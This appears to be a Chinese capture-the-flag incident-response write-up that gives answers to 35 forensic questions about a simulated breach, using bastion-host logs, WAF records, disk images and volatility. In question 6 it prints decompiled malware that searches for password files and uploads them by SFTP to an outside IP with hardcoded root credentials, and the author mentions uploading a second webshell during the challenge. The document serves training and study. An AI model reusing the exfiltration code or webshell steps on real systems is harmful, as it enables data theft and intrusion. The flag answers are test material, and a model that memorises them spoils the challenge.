        <content type="html"><![CDATA[<h2 id="一、背景信息"><a href="#一、背景信息" class="headerlink" title="一、背景信息"></a>一、背景信息</h2><p>​在这个跳跃的数字舞台上，数据安全成了政企单位稳航的重要压舱石。某政企单位，作为一艘驶向未来的巨轮，对数据的把控丝毫不敢松懈。眼下，我们即将启航一场无与伦比的探险——“信息安全探索之旅”。</p><p>​这趟旅程的目的是遍访我们的信息系统每一个角落，探寻隐藏在暗处的风险海怪，提升船员们对数据宝藏的守护意识，确保我们的珍贵资讯宝藏不被外界窥见，不受损害，随时准备发挥其价值。在这场航旅中，某政企单位期望锻造一副更加坚不可摧的数据防护铠甲，增强面对意外风暴的航行能力。</p><p>​你和你的团队，作为这次探险的领航员，将借助先进的应急响应罗盘，对我们的内部信息航道进行全域的安全梳理。从网络的海洋到系统的天空，从数据库的深渊到应用的岛屿，无一处不在你们的巡航范围之内。我们将特别防范那些潜伏的数据海盗——数据泄露、非法入侵、恶意攻击，以及物联网设备安全上的狂风骤雨。</p><p>​让我们携手共航，把这次“信息安全探索之旅”变成一个传奇，确保我们的信息系统像最强大的舰队领航者一样，勇敢、可靠、无所畏惧。向着更安全的港湾，全速前进！</p><h2 id="二、网络拓扑"><a href="#二、网络拓扑" class="headerlink" title="二、网络拓扑"></a>二、网络拓扑</h2><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240426221311597.png" alt="image-20240426221311597"></p><h2 id="三、资产清单"><a href="#三、资产清单" class="headerlink" title="三、资产清单"></a>三、资产清单</h2><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240426221442628.png" alt="image-20240426221442628"></p><blockquote><p>wp参考了套神的blog和风二西师傅的视频教程</p></blockquote><p><a href="https://blog.csdn.net/qq_42880719/article/details/138044123">第一届 “帕鲁杯“ writeup_帕鲁杯第一名wp-CSDN博客</a><br><a href="https://www.bilibili.com/video/BV11i421C7e8/?share_source=copy_web&vd_source=910f74eed0a5831695dd80cf4ed00a8e">第一届 “帕鲁杯”  CTF挑战赛_应急题目复现</a></p><h2 id="应急响应题目"><a href="#应急响应题目" class="headerlink" title="应急响应题目"></a>应急响应题目</h2><h3 id="1-签到"><a href="#1-签到" class="headerlink" title="1. 签到"></a>1. 签到</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交:[堡垒机的flag标签的值]</span><br></pre></td></tr></table></figure><p>登陆 在标签列表中存在flag</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240426222622407.png" alt="image-20240426222622407"></p><p>[BrYeaVj54009rDIZzu4O]</p><h3 id="2-提交攻击者第一次登录时间"><a href="#2-提交攻击者第一次登录时间" class="headerlink" title="2.提交攻击者第一次登录时间"></a>2.提交攻击者第一次登录时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[2024/00/00/00:00:00]</span><br></pre></td></tr></table></figure><p>JumpServer切换到审计台，日志审计-登陆日志  获取登陆成功信息<br>由于 登陆城市 LAN  与 其他 显示 局域网 不一致<br>可判断 这一条为攻击者第一次登录时间</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240426223806488.png" alt="image-20240426223806488"></p><p>[2024&#x2F;04&#x2F;11&#x2F;14:21:18]</p><h3 id="3-提交攻击者源IP"><a href="#3-提交攻击者源IP" class="headerlink" title="3.提交攻击者源IP"></a>3.提交攻击者源IP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[0.0.0.0]</span><br></pre></td></tr></table></figure><p>由上题 可以往 192.168.1.4 和 192.168.20.123 靠<br>flag为[192.168.1.4]</p><h3 id="4-提交攻者使用的cve编号"><a href="#4-提交攻者使用的cve编号" class="headerlink" title="4.提交攻者使用的cve编号"></a>4.提交攻者使用的cve编号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[CVE-0000-0000]</span><br></pre></td></tr></table></figure><p>JumpServer的漏洞   [CVE-2024-29201]</p><h3 id="5-提交攻击者留着web服务器上的恶意程序的32位小写md5"><a href="#5-提交攻击者留着web服务器上的恶意程序的32位小写md5" class="headerlink" title="5.提交攻击者留着web服务器上的恶意程序的32位小写md5"></a>5.提交攻击者留着web服务器上的恶意程序的32位小写md5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxxxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240427210301136.png" alt="image-20240427210301136"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240427210523638.png" alt="image-20240427210523638"></p><p>回放会话 不敢相信 root目录下存在一个home程序</p><p>flag:[84413332e4e7138adc5d6f1f688ddd69]</p><h3 id="6-分析恶意程序连接地址和密码"><a href="#6-分析恶意程序连接地址和密码" class="headerlink" title="6.分析恶意程序连接地址和密码"></a>6.分析恶意程序连接地址和密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[md5(地址)-md5(密码)]全小写</span><br></pre></td></tr></table></figure><p>可以 将vmdk放到DiskGenius里分析（跟套神wp看到的）<br>tips：将vmdk镜像拷贝一个副本进行分析<br>导文件这儿 卡了我好久 我纠结在 如何通过JumpServer运维机导出文件<br>也可以在DiskGenius进行导出（需要专业版）<br>卡在为什么会有思路去解包（来自逆向小白的疑问）<br>也是第一次学将程序(linux程序)解包成pyc<br>之前好像有Windows程序解包的经历（忘了是在哪个比赛了）<br>每次拿到可执行程序 我第一个想法是放到情报平台里看<br>因为 有些平台中网络连接地址 会直接显示出来</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430114007240.png" alt="image-20240430114007240"><br>解包工具<br><a href="https://github.com/extremecoders-re/pyinstxtractor">extremecoders-re&#x2F;pyinstxtractor: PyInstaller Extractor (github.com)</a><br>home是一个python程序  需要进行解包<br>成功解出pyc文件<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430114211076.png" alt="image-20240430114211076"></p><p>pyc文件进行反编译  可以使用（uncompyle6）</p><blockquote><p>uncompyle6模块会因为版本不对应的问题而失败</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430114717204.png" alt="image-20240430114717204"><br>使用在线平台<br><a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a><br>成功进行了将pyc文件反编译成py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_in_files</span>(<span class="params">directory, search_text</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssh</span>(<span class="params">local_file_path, remote_file_path</span>):</span><br><span class="line">    hostname = <span class="string">&#x27;82.157.238.111&#x27;</span></span><br><span class="line">    port = <span class="number">22</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;1qaz@WSX3edc&#x27;</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(hostname, port, username, password)</span><br><span class="line">    sftp = client.open_sftp()</span><br><span class="line">    sftp.put(local_file_path, remote_file_path)</span><br><span class="line">    sftp.close()</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;File <span class="subst">&#123;local_file_path&#125;</span> uploaded to <span class="subst">&#123;remote_file_path&#125;</span> on <span class="subst">&#123;hostname&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">search_directory = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">search_for_text = <span class="string">&#x27;passwod&#x27;</span></span><br><span class="line">(a, b) = search_in_files(search_directory, search_for_text)</span><br><span class="line">ssh(a, b)</span><br></pre></td></tr></table></figure><p>根据源代码</p><p>flag:[md5(82.157.238.111)-md5(1qaz@WSX3edc)]</p><h3 id="7-提交存在反序列化漏洞的端口"><a href="#7-提交存在反序列化漏洞的端口" class="headerlink" title="7. 提交存在反序列化漏洞的端口"></a>7. 提交存在反序列化漏洞的端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[md5(端口)]</span><br></pre></td></tr></table></figure><p>通过waf翻日志 过滤攻击类型 发现漏洞<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240428224515896.png" alt="image-20240428224515896"><br>flag:[md5(8080)]</p><h3 id="8-提交攻击者使用的后门路由地址"><a href="#8-提交攻击者使用的后门路由地址" class="headerlink" title="8. 提交攻击者使用的后门路由地址"></a>8. 提交攻击者使用的后门路由地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[md5(/api/xxx)]</span><br></pre></td></tr></table></figure><p>在jumpServer发现命令 cat app.py<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240428225329516.png" alt="image-20240428225329516">不是一般人 还真不会这么翻、、、</p><p>flag:[md5(&#x2F;api&#x2F;system)]</p><h3 id="9-提交dnslog反弹域名"><a href="#9-提交dnslog反弹域名" class="headerlink" title="9. 提交dnslog反弹域名"></a>9. 提交dnslog反弹域名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[md5(域名)]</span><br></pre></td></tr></table></figure><p>当时自己的做法（通过已知后门再传个后门）<br>由于网站根目录有个GET木马　然后　再上传一个POST木马 蚁剑连接<br>在翻到了flask目录下翻到了日志<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image.png" alt="image"><br>emm 上面 有<a href="https://0vqkht.dnslog.cn/">0vqkht.dnslog.cn</a> 被迷惑了好久 最后 翻到了</p><p>flag:[md5(0vqkht.palu.cn)]</p><h3 id="10-提交第一次扫描器使用时间"><a href="#10-提交第一次扫描器使用时间" class="headerlink" title="10. 提交第一次扫描器使用时间"></a>10. 提交第一次扫描器使用时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[2024/00/00/00:00:00]</span><br></pre></td></tr></table></figure><p>这题 我一直拿目录扫描 作为第一次扫描器使用时间<br>这里看了套神的wp<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430144850390.png" alt="image-20240430144850390"><br>他的判断依据是 间隔时间非常短  尝试时间戳转时间提交试了一下<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430145544467.png" alt="image-20240430145544467"></p><p>flag：[2024&#x2F;04&#x2F;15&#x2F;02:26:59]</p><h3 id="11-提交攻击者反弹shell使用的语言"><a href="#11-提交攻击者反弹shell使用的语言" class="headerlink" title="11.提交攻击者反弹shell使用的语言"></a>11.提交攻击者反弹shell使用的语言</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[md5(c++&amp;java)]均为小写</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430151423497.png" alt="image-20240430151423497">可以知道是python进行的一个反弹shell</p><p>flag:[md5(python)]</p><h3 id="12-提交攻击者反弹shell的ip"><a href="#12-提交攻击者反弹shell的ip" class="headerlink" title="12. 提交攻击者反弹shell的ip"></a>12. 提交攻击者反弹shell的ip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxx.xxx.xxx.xxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430154141567.png" alt="image-20240430154141567"><br>将base64进行解码得到反弹shell的ip和端口</p><p>flag:[82.157.238.174]</p><h3 id="13-提交攻击者留下的账号"><a href="#13-提交攻击者留下的账号" class="headerlink" title="13. 提交攻击者留下的账号"></a><strong>13.</strong> 提交攻击者留下的账号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxxx]</span><br></pre></td></tr></table></figure><p>查看&#x2F;etc&#x2F;passwd<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430155621849.png" alt="image-20240430155621849"></p><p>flag:[palu.com]</p><h3 id="14-提交攻击者的后门账户密码"><a href="#14-提交攻击者的后门账户密码" class="headerlink" title="14. 提交攻击者的后门账户密码"></a>14. 提交攻击者的后门账户密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[md5(password)]</span><br></pre></td></tr></table></figure><p>查看 &#x2F;etc&#x2F;shadow 可以根据hash爆破出密码<br>比赛的时候没有权限  也没想着去提权之类的<br>套神使用的 DiskGenius 直接从镜像内存中提取出来 绝了<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430160133849.png" alt="image-20240430160133849"><br>提取出攻击者的后门账户hash值<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430160422858.png" alt="image-20240430160422858"></p><p>flag:[md5(123123)]</p><h3 id="15-提交测试数据条数"><a href="#15-提交测试数据条数" class="headerlink" title="15. 提交测试数据条数"></a>15. 提交测试数据条数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为[md5(xxx)]</span><br></pre></td></tr></table></figure><p>连接数据库MYSQL Server 1 查看palu_ctf库中user表<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430161937320.png" alt="image-20240430161937320"></p><p>flag:[md5(5)]</p><h3 id="16-请提交攻击者留下的信息"><a href="#16-请提交攻击者留下的信息" class="headerlink" title="16. 请提交攻击者留下的信息"></a>16. 请提交攻击者留下的信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p>在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;下存在 hacktext<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430212748204.png" alt="image-20240430212748204"></p><p>flag:[flag{hi_palu_f10g}]</p><h3 id="17-请提交运维服务器上的恶意文件md5小写32md5值"><a href="#17-请提交运维服务器上的恶意文件md5小写32md5值" class="headerlink" title="17. 请提交运维服务器上的恶意文件md5小写32md5值"></a>17. 请提交运维服务器上的恶意文件md5小写32md5值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430220833470.png" alt="image-20240430220833470"><br>与第五题类似</p><p>flag：[0fca0f847a45401c878d7a5303ddc1f8]</p><h3 id="18-提交恶意文件的恶意函数"><a href="#18-提交恶意文件的恶意函数" class="headerlink" title="18. 提交恶意文件的恶意函数"></a>18. 提交恶意文件的恶意函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[md5(恶意函数)]</span><br></pre></td></tr></table></figure><p>想要得到恶意文件 helloword<br>使用DiskGenius 没有出现lib目录 没有整出恶意文件<br>尝试ssh连接 也禁止远程连接 使用python起一个网页服务<br>然后 将文件进行下载<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430222655520.png" alt="image-20240430222655520"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430223007006.png" alt="image-20240430223007006"></p><p>师傅们认为haveadoor为恶意函数  flag却是begingame</p><p>flag:[md5(begingame)]</p><h3 id="19-请提交攻击者恶意注册的恶意用户条数"><a href="#19-请提交攻击者恶意注册的恶意用户条数" class="headerlink" title="19.请提交攻击者恶意注册的恶意用户条数"></a>19.请提交攻击者恶意注册的恶意用户条数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[md5(x)]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430224502750.png" alt="image-20240430224502750"><br>恶意注册的恶意用户条数为10条</p><p>flag:[md5(10)]</p><h3 id="20-请提交对博客系统的第一次扫描时间"><a href="#20-请提交对博客系统的第一次扫描时间" class="headerlink" title="20. 请提交对博客系统的第一次扫描时间"></a>20. 请提交对博客系统的第一次扫描时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[2024/00/00/00:00:00]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430230207088.png" alt="image-20240430230207088"></p><p>大量发送数据探测</p><p>flag:[2024&#x2F;04&#x2F;16&#x2F;21:03:46]</p><h3 id="21-提交攻击者下载的文件"><a href="#21-提交攻击者下载的文件" class="headerlink" title="21.提交攻击者下载的文件"></a>21.提交攻击者下载的文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为[xxxx.xxx]</span><br></pre></td></tr></table></figure><p>waf查看资源总数<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240430225404075.png" alt="image-20240430225404075"></p><p>flag:[upload.zip]</p><h3 id="22-请提交攻击者第一次下载的时间"><a href="#22-请提交攻击者第一次下载的时间" class="headerlink" title="22.请提交攻击者第一次下载的时间"></a>22.请提交攻击者第一次下载的时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xx/Apr/2024:xx:xx:xx]</span><br></pre></td></tr></table></figure><p>根据上题  已经知道攻击者下载的文件 继续分析  查看日志<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506090926975.png" alt="image-20240506090926975"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506091256813.png" alt="image-20240506091256813"></p><p>flag:[16&#x2F;Apr&#x2F;2024:09:03:52]</p><h3 id="23-请提交攻击者留下的冰蝎马的文件名称"><a href="#23-请提交攻击者留下的冰蝎马的文件名称" class="headerlink" title="23. 请提交攻击者留下的冰蝎马的文件名称"></a>23. 请提交攻击者留下的冰蝎马的文件名称</h3><p>格式为:[xxxx]<br>查看命令记录</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506091838766.png" alt="image-20240506091838766"></p><p>对照命令翻文件判断</p><p>flag:[nidewen.php]</p><h3 id="24-提交冰蝎的链接密码"><a href="#24-提交冰蝎的链接密码" class="headerlink" title="24.提交冰蝎的链接密码"></a>24.提交冰蝎的链接密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506092110190.png" alt="image-20240506092110190"><br>key为md5前十六位 首先cmd5解密 发现付费<br>也可以使用字典碰撞<br>（在github搜代码)</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506092415578.png" alt="image-20240506092415578"></p><p>flag:[nidewen]</p><h3 id="25-提交办公区存在的恶意用户名"><a href="#25-提交办公区存在的恶意用户名" class="headerlink" title="25. 提交办公区存在的恶意用户名"></a>25. 提交办公区存在的恶意用户名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxx]</span><br></pre></td></tr></table></figure><p>查看 PC1 电脑  （net user）<br>有时候 创建用户 net user并不可以看到<br>需要查看用户组<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506092819584.png" alt="image-20240506092819584"></p><p>flag:[hacker]</p><h3 id="26-提交恶意用户密码到期时间"><a href="#26-提交恶意用户密码到期时间" class="headerlink" title="26.提交恶意用户密码到期时间"></a>26.提交恶意用户密码到期时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506093012110.png" alt="image-20240506093012110"></p><p>flag:[2024&#x2F;5&#x2F;28&#x2F;21:40:37]</p><h3 id="27-请对办公区留存的镜像取证并指出内存疑似恶意进程"><a href="#27-请对办公区留存的镜像取证并指出内存疑似恶意进程" class="headerlink" title="27.请对办公区留存的镜像取证并指出内存疑似恶意进程"></a>27.请对办公区留存的镜像取证并指出内存疑似恶意进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p>内存文件<br>volatility启动<br>查看镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f raw.raw imageinfo </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506094459177.png" alt="image-20240506094459177"><br>查看进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f raw.raw --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506094558677.png" alt="image-20240506094558677"></p><p>flag:[.hack.ex]</p><h3 id="28-请指出该员工使用的公司OA平台的密码"><a href="#28-请指出该员工使用的公司OA平台的密码" class="headerlink" title="28.请指出该员工使用的公司OA平台的密码"></a>28.请指出该员工使用的公司OA平台的密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506095835155.png" alt="image-20240506095835155"><br>根据题目filescan 筛选pass<br>dumpfiles提取出文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f raw.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e296f20 -D ./</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506100545349.png" alt="image-20240506100545349"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url: http://test.oa.com/login.html</span><br><span class="line">username: liuling</span><br><span class="line">password: liuling7541</span><br></pre></td></tr></table></figure><p>flag:[liuling7541]</p><h3 id="29-攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么"><a href="#29-攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么" class="headerlink" title="29.攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么"></a>29.攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p>查看基本信息的时候 发现剪贴板中有文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f raw.raw --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506101233674.png" alt="image-20240506101233674"></p><p>flag:[h4ck3d!]</p><h3 id="30-请提交该计算机中记录的重要联系人的家庭住址"><a href="#30-请提交该计算机中记录的重要联系人的家庭住址" class="headerlink" title="30.请提交该计算机中记录的重要联系人的家庭住址"></a>30.请提交该计算机中记录的重要联系人的家庭住址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxxx]</span><br></pre></td></tr></table></figure><p>拿到该题  一般 方便 我们会把敏感信息放桌面<br>可以先filescan桌面<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506101933007.png" alt="image-20240506101933007"><br>发现没有什么有用信息 可以搜用户栏或者指定用户<img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506102023466.png" alt="image-20240506102023466"><br>有 Contacts文件夹  我们可以进一步过滤<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506102210602.png" alt="image-20240506102210602"></p><p>dumpfiles 数据<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506102443262.png" alt="image-20240506102443262"></p><p>flag:[秋水省雁荡市碧波区千屿山庄1号]</p><h3 id="31-请提交近源靶机上的恶意文件哈希"><a href="#31-请提交近源靶机上的恶意文件哈希" class="headerlink" title="31.请提交近源靶机上的恶意文件哈希"></a>31.请提交近源靶机上的恶意文件哈希</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxx]</span><br></pre></td></tr></table></figure><p>打开PC2 并会自动打开开始菜单的一个文件夹，猜测为恶意文件<br>使用系统自带的命令计算hash（certutil.exe）<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506104644947.png" alt="image-20240506104644947"></p><p>flag:[a7fcd0b15a080167c4c2f05063802a6e]</p><h3 id="32-提交恶意程序的外联地址"><a href="#32-提交恶意程序的外联地址" class="headerlink" title="32.提交恶意程序的外联地址"></a>32.提交恶意程序的外联地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506105954533.png" alt="image-20240506105954533"></p><p>flag:[101.78.63.44]</p><h3 id="33-提交攻击者使用内网扫描工具的哈希"><a href="#33-提交攻击者使用内网扫描工具的哈希" class="headerlink" title="33.提交攻击者使用内网扫描工具的哈希"></a>33.提交攻击者使用内网扫描工具的哈希</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506120043949.png" alt="image-20240506120043949"></p><p>在命令记录中看到fscan<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506120325772.png" alt="image-20240506120325772"></p><p>flag:[1facdcd05c43ba4d37274dffc90b6d4e]</p><h3 id="34-请提交攻击者在站点上留下的后门密码"><a href="#34-请提交攻击者在站点上留下的后门密码" class="headerlink" title="34.请提交攻击者在站点上留下的后门密码"></a>34.请提交攻击者在站点上留下的后门密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[md5(xxxx)]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506121336697.png" alt="image-20240506121336697"></p><p>flag:[md5(123)]</p><h3 id="35-请提交攻击者在数据库留下的信息"><a href="#35-请提交攻击者在数据库留下的信息" class="headerlink" title="35.请提交攻击者在数据库留下的信息"></a>35.请提交攻击者在数据库留下的信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506135806330.png" alt="image-20240506135806330"></p><p>flag:[flag{hack_palu}]</p><h3 id="36-提交攻击者在监控服务器上留下的dcnlog地址"><a 